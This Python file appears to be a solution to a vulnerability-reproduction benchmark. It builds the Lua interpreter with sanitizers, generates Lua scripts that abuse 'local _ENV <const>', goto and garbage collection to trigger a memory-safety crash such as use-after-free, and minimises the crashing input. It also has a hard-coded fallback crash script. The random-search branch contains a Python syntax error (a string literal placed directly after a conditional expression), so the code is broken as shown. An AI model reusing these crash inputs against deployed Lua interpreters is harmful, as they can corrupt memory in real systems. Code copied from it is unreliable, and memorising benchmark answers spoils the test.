import os
import re
import tarfile
import tempfile
import subprocess
import shutil
import time
from typing import Optional, List, Tuple


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.abspath(path)
    for member in tar.getmembers():
        member_path = os.path.abspath(os.path.join(path, member.name))
        if not (member_path == base or member_path.startswith(base + os.sep)):
            continue
        tar.extract(member, path=path)


def _find_lua_project_root(base: str) -> Optional[str]:
    # Prefer standard Lua layout: <root>/src/lua.c, <root>/Makefile
    candidates = []
    for root, dirs, files in os.walk(base):
        if 'lua.c' in files and os.path.basename(root) == 'src':
            proj_root = os.path.dirname(root)
            candidates.append(proj_root)
    if candidates:
        # pick shortest path (closest to base)
        candidates.sort(key=lambda p: len(os.path.relpath(p, base).split(os.sep)))
        return candidates[0]

    # Fallback: look for Makefile that has "luac" target and lua.c nearby
    for root, dirs, files in os.walk(base):
        if 'Makefile' in files:
            mk = os.path.join(root, 'Makefile')
            try:
                with open(mk, 'r', errors='ignore') as f:
                    txt = f.read(200000)
                if 'luac' in txt and 'lua' in txt:
                    return root
            except OSError:
                pass
    return None


def _which_cc() -> str:
    for cc in ('clang', 'gcc'):
        p = shutil.which(cc)
        if p:
            return cc
    return 'cc'


def _run(cmd: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, timeout: int = 120) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        cwd=cwd,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        text=True,
        errors='replace'
    )


def _build_lua(proj_root: str, deadline: float) -> Tuple[Optional[str], Optional[str]]:
    cc = _which_cc()
    cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined"
    ldflags = "-fsanitize=address,undefined"

    env = os.environ.copy()
    env['CC'] = cc
    env['MYCFLAGS'] = cflags
    env['MYLDFLAGS'] = ldflags

    # Some builds are sensitive to -Werror; reduce noise.
    env.setdefault('CFLAGS', '')
    env.setdefault('LDFLAGS', '')

    build_attempts = []
    # Standard Lua: build from root with target
    for target in ('linux', 'posix', 'generic', 'all'):
        build_attempts.append((proj_root, ['make', '-j8', target]))

    # Or build from src directory
    srcdir = os.path.join(proj_root, 'src')
    if os.path.isdir(srcdir):
        for target in ('linux', 'posix', 'generic', 'all'):
            build_attempts.append((srcdir, ['make', '-j8', target]))

    # Try clean lightly (ignore failures)
    for d in (proj_root, srcdir):
        if os.path.isdir(d) and os.path.isfile(os.path.join(d, 'Makefile')):
            try:
                _run(['make', 'clean'], cwd=d, env=env, timeout=max(10, int(deadline - time.monotonic())))
            except Exception:
                pass

    for cwd, cmd in build_attempts:
        if time.monotonic() > deadline:
            break
        if not os.path.isfile(os.path.join(cwd, 'Makefile')):
            continue
        try:
            tout = max(10, int(deadline - time.monotonic()))
            cp = _run(cmd, cwd=cwd, env=env, timeout=tout)
            if cp.returncode == 0:
                lua_path, luac_path = _find_binaries(proj_root)
                if lua_path:
                    return lua_path, luac_path
        except Exception:
            continue

    lua_path, luac_path = _find_binaries(proj_root)
    return lua_path, luac_path


def _find_binaries(proj_root: str) -> Tuple[Optional[str], Optional[str]]:
    def is_exe(p: str) -> bool:
        return os.path.isfile(p) and os.access(p, os.X_OK)

    # Standard locations
    for p in (
        os.path.join(proj_root, 'src', 'lua'),
        os.path.join(proj_root, 'lua'),
    ):
        if is_exe(p):
            lua_path = p
            break
    else:
        lua_path = None

    for p in (
        os.path.join(proj_root, 'src', 'luac'),
        os.path.join(proj_root, 'luac'),
    ):
        if is_exe(p):
            luac_path = p
            break
    else:
        luac_path = None

    # Fallback search
    if not lua_path or not luac_path:
        found_lua = None
        found_luac = None
        for root, dirs, files in os.walk(proj_root):
            if not found_lua and 'lua' in files:
                p = os.path.join(root, 'lua')
                if is_exe(p):
                    found_lua = p
            if not found_luac and 'luac' in files:
                p = os.path.join(root, 'luac')
                if is_exe(p):
                    found_luac = p
            if (lua_path or found_lua) and (luac_path or found_luac):
                break
        lua_path = lua_path or found_lua
        luac_path = luac_path or found_luac

    return lua_path, luac_path


def _looks_like_sanitizer_crash(stderr: str, returncode: int) -> bool:
    if returncode < 0:
        return True
    s = stderr
    if 'AddressSanitizer' in s or 'UndefinedBehaviorSanitizer' in s or 'LeakSanitizer' in s:
        return True
    if 'heap-use-after-free' in s or 'use-after-free' in s:
        return True
    if 'ERROR:' in s and 'Sanitizer' in s:
        return True
    if 'SEGV' in s and ('ERROR' in s or 'Sanitizer' in s):
        return True
    return False


def _looks_like_lua_error(stderr: str) -> bool:
    st = stderr.strip()
    if not st:
        return False
    if st.startswith('lua:') or st.startswith('luac:'):
        return True
    if 'stack traceback:' in st:
        return True
    if 'syntax error' in st:
        return True
    if 'unexpected symbol' in st:
        return True
    if 'near \'' in st and 'error' in st:
        return True
    return False


def _test_candidate(lua_path: str, luac_path: Optional[str], prog: bytes, timeout_s: int = 3) -> Tuple[bool, str]:
    with tempfile.TemporaryDirectory() as td:
        fpath = os.path.join(td, 'poc.lua')
        with open(fpath, 'wb') as f:
            f.write(prog)

        env = os.environ.copy()
        env['ASAN_OPTIONS'] = env.get('ASAN_OPTIONS', '') + (':' if env.get('ASAN_OPTIONS') else '') + "detect_leaks=0:abort_on_error=1:allocator_may_return_null=1"
        env['UBSAN_OPTIONS'] = env.get('UBSAN_OPTIONS', '') + (':' if env.get('UBSAN_OPTIONS') else '') + "halt_on_error=1:abort_on_error=1:print_stacktrace=1"

        if luac_path and os.path.isfile(luac_path) and os.access(luac_path, os.X_OK):
            try:
                cp = _run([luac_path, '-p', fpath], cwd=os.path.dirname(luac_path), env=env, timeout=timeout_s)
                if _looks_like_sanitizer_crash(cp.stderr, cp.returncode):
                    return True, 'luac'
                if cp.returncode != 0:
                    if _looks_like_lua_error(cp.stderr):
                        return False, 'syntax'
            except Exception:
                pass

        try:
            cp = _run([lua_path, fpath], cwd=os.path.dirname(lua_path), env=env, timeout=timeout_s)
        except subprocess.TimeoutExpired:
            return False, 'timeout'
        except Exception:
            return False, 'execfail'

        if _looks_like_sanitizer_crash(cp.stderr, cp.returncode):
            return True, 'lua'
        if cp.returncode != 0 and _looks_like_lua_error(cp.stderr):
            return False, 'luaerror'
        return False, 'noclash'


def _ddmin_lines(lines: List[str], test_fn, deadline: float) -> List[str]:
    if not lines:
        return lines
    n = 2
    best = lines[:]

    def join(ls: List[str]) -> bytes:
        return ("\n".join(ls).rstrip() + "\n").encode('utf-8', 'surrogatepass')

    base_prog = join(best)
    ok, _ = test_fn(base_prog)
    if not ok:
        return best

    while time.monotonic() < deadline:
        length = len(best)
        if length < 2:
            break
        if n > length:
            break
        chunk_size = (length + n - 1) // n
        reduced = False
        for i in range(0, length, chunk_size):
            if time.monotonic() >= deadline:
                break
            trial = best[:i] + best[i + chunk_size:]
            if not trial:
                continue
            prog = join(trial)
            ok, _ = test_fn(prog)
            if ok:
                best = trial
                n = 2
                reduced = True
                break
        if not reduced:
            if n >= length:
                break
            n = min(length, n * 2)
    return best


def _gen_candidates() -> List[bytes]:
    cands: List[str] = []

    cands.append(
        "local G=_G\n"
        "local _ENV <const> = setmetatable({}, {__index=G})\n"
        "local function f()\n"
        "  return math.floor(0)\n"
        "end\n"
        "return f()\n"
    )

    cands.append(
        "local G=_G\n"
        "local out\n"
        "do\n"
        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
        "  function a()\n"
        "    return tostring(math.floor(0))\n"
        "  end\n"
        "  out = a\n"
        "  goto L\n"
        "end\n"
        "::L::\n"
        "collectgarbage('collect')\n"
        "return out()\n"
    )

    cands.append(
        "local G=_G\n"
        "local out\n"
        "do\n"
        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
        "  local function wrap()\n"
        "    function a()\n"
        "      local s = ''\n"
        "      s = s .. tostring(math.floor(0))\n"
        "      return s\n"
        "    end\n"
        "    return a\n"
        "  end\n"
        "  out = wrap()\n"
        "  goto L\n"
        "end\n"
        "::L::\n"
        "collectgarbage('collect')\n"
        "local t={}\n"
        "for i=1,2000 do t[i]=i end\n"
        "collectgarbage('collect')\n"
        "return out()\n"
    )

    cands.append(
        "local G=_G\n"
        "local out\n"
        "do\n"
        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
        "  local function mk()\n"
        "    local u = 1\n"
        "    function a(x)\n"
        "      if x then\n"
        "        goto L1\n"
        "      end\n"
        "      ::L1::\n"
        "      return (u + 1) + math.floor(0)\n"
        "    end\n"
        "    return a\n"
        "  end\n"
        "  out = mk()\n"
        "  goto L0\n"
        "end\n"
        "::L0::\n"
        "collectgarbage('collect')\n"
        "return out(true)\n"
    )

    # Register pressure / upvalue capture variants
    for n in (5, 10, 20, 40, 80, 120):
        locals_decl = ",".join(f"a{i}" for i in range(1, n + 1))
        locals_vals = ",".join(str(i) for i in range(1, n + 1))
        sum_expr = " + ".join(f"a{i}" for i in range(1, n + 1))
        cands.append(
            "local G=_G\n"
            "local out\n"
            "do\n"
            "  local _ENV <const> = setmetatable({}, {__index=G})\n"
            f"  local {locals_decl} = {locals_vals}\n"
            "  local function mk()\n"
            "    function a(x)\n"
            f"      local z = ({sum_expr}) + math.floor(0)\n"
            "      if x then goto L1 end\n"
            "      ::L1::\n"
            "      return z\n"
            "    end\n"
            "    return a\n"
            "  end\n"
            "  out = mk()\n"
            "  goto L0\n"
            "end\n"
            "::L0::\n"
            "collectgarbage('collect')\n"
            "local t={}\n"
            "for i=1,3000 do t[i]=i end\n"
            "collectgarbage('collect')\n"
            "return out(true)\n"
        )

    # Multiple nested _ENV<const> blocks
    cands.append(
        "local G=_G\n"
        "local out\n"
        "do\n"
        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
        "  do\n"
        "    local _ENV <const> = setmetatable({}, {__index=G})\n"
        "    function a()\n"
        "      return tostring(math.floor(0))\n"
        "    end\n"
        "    out = a\n"
        "  end\n"
        "  goto L\n"
        "end\n"
        "::L::\n"
        "collectgarbage('collect')\n"
        "return out()\n"
    )

    return [s.encode('utf-8', 'surrogatepass') for s in cands]


def _fallback_poc() -> bytes:
    s = (
        "local G=_G\n"
        "local out1, out2, out3\n"
        "do\n"
        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
        "  function a1()\n"
        "    local x = 0\n"
        "    for i=1,10 do x = x + i end\n"
        "    return tostring(x + math.floor(0))\n"
        "  end\n"
        "  out1 = a1\n"
        "  goto L1\n"
        "end\n"
        "::L1::\n"
        "do\n"
        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
        "  local function wrap()\n"
        "    function a2(y)\n"
        "      if y then goto L2 end\n"
        "      ::L2::\n"
        "      local t={}\n"
        "      for i=1,50 do t[i]=i end\n"
        "      return #t + math.floor(0)\n"
        "    end\n"
        "    return a2\n"
        "  end\n"
        "  out2 = wrap()\n"
        "  goto L3\n"
        "end\n"
        "::L3::\n"
        "do\n"
        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
        "  local a,b,c,d,e,f,g,h,i,j = 1,2,3,4,5,6,7,8,9,10\n"
        "  function a3()\n"
        "    local z = (a+b+c+d+e+f+g+h+i+j) + math.floor(0)\n"
        "    return z\n"
        "  end\n"
        "  out3 = a3\n"
        "end\n"
        "collectgarbage('collect')\n"
        "local t={}\n"
        "for k=1,5000 do t[k]=k end\n"
        "collectgarbage('collect')\n"
        "local r1 = out1()\n"
        "local r2 = out2(true)\n"
        "local r3 = out3()\n"
        "if r1 == nil or r2 == nil or r3 == nil then return 0 end\n"
        "return 0\n"
    )
    return s.encode('utf-8', 'surrogatepass')


class Solution:
    def solve(self, src_path: str) -> bytes:
        start = time.monotonic()
        deadline = start + 110.0

        with tempfile.TemporaryDirectory() as td:
            try:
                with tarfile.open(src_path, 'r:*') as tar:
                    _safe_extract_tar(tar, td)
            except Exception:
                return _fallback_poc()

            proj_root = _find_lua_project_root(td)
            if not proj_root:
                return _fallback_poc()

            lua_path, luac_path = _build_lua(proj_root, deadline=deadline)
            if not lua_path:
                return _fallback_poc()

            candidates = _gen_candidates()

            def test_fn(prog: bytes) -> Tuple[bool, str]:
                return _test_candidate(lua_path, luac_path, prog, timeout_s=3)

            found: Optional[bytes] = None
            for prog in candidates:
                if time.monotonic() > deadline:
                    break
                ok, _where = test_fn(prog)
                if ok:
                    found = prog
                    break

            if not found and time.monotonic() < deadline:
                # Randomized small search around register pressure and goto patterns
                import random
                rng = random.Random(0x44597)
                for _ in range(200):
                    if time.monotonic() > deadline:
                        break
                    n = rng.choice([8, 12, 16, 24, 32, 48, 64, 96, 128, 160])
                    use_nested = rng.choice([False, True])
                    use_goto = rng.choice([True, True, False])

                    locals_decl = ",".join(f"a{i}" for i in range(1, n + 1))
                    locals_vals = ",".join(str((i % 17) + 1) for i in range(1, n + 1))
                    sum_expr = " + ".join(f"a{i}" for i in range(1, n + 1))

                    if use_nested:
                        body = (
                            "do\n"
                            "  local _ENV <const> = setmetatable({}, {__index=G})\n"
                            "  local function mk()\n"
                            "    function a(x)\n"
                            f"      local z = ({sum_expr}) + math.floor(0)\n"
                            + ("      if x then goto L1 end\n      ::L1::\n" if use_goto else "")
                            "      return z\n"
                            "    end\n"
                            "    return a\n"
                            "  end\n"
                            "  out = mk()\n"
                            + ("  goto L0\n" if use_goto else "")
                            "end\n"
                            + ("::L0::\n" if use_goto else "")
                        )
                        prog_s = (
                            "local G=_G\n"
                            "local out\n"
                            f"{body}"
                            "collectgarbage('collect')\n"
                            "local t={}\n"
                            "for i=1,3000 do t[i]=i end\n"
                            "collectgarbage('collect')\n"
                            "return out(true)\n"
                        )
                    else:
                        prog_s = (
                            "local G=_G\n"
                            "local out\n"
                            "do\n"
                            "  local _ENV <const> = setmetatable({}, {__index=G})\n"
                            f"  local {locals_decl} = {locals_vals}\n"
                            "  function a(x)\n"
                            f"    local z = ({sum_expr}) + math.floor(0)\n"
                            + ("    if x then goto L1 end\n    ::L1::\n" if use_goto else "")
                            "    return z\n"
                            "  end\n"
                            "  out = a\n"
                            + ("  goto L0\n" if use_goto else "")
                            "end\n"
                            + ("::L0::\n" if use_goto else "")
                            "collectgarbage('collect')\n"
                            "local t={}\n"
                            "for i=1,3000 do t[i]=i end\n"
                            "collectgarbage('collect')\n"
                            "return out(true)\n"
                        )
                    prog = prog_s.encode('utf-8', 'surrogatepass')
                    ok, _where = test_fn(prog)
                    if ok:
                        found = prog
                        break

            if not found:
                return _fallback_poc()

            # Minimize (line-based) with remaining time
            remaining = max(0.0, deadline - time.monotonic())
            min_deadline = time.monotonic() + min(25.0, remaining)
            try:
                text = found.decode('utf-8', 'surrogatepass')
                lines = text.splitlines()
                minimized_lines = _ddmin_lines(lines, test_fn, min_deadline)
                minimized = ("\n".join(minimized_lines).rstrip() + "\n").encode('utf-8', 'surrogatepass')
                ok, _ = test_fn(minimized)
                if ok:
                    return minimized
            except Exception:
                pass

            return found